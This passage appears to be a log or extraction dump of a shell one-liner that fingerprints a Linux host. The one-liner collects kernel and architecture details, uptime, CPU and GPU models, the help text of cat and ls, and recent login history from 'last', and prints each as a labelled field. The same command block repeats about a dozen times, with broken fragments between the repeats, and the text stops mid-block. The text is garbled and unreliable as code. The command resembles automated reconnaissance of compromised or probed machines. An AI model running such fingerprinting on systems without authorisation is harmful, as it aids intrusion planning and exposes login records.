-d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		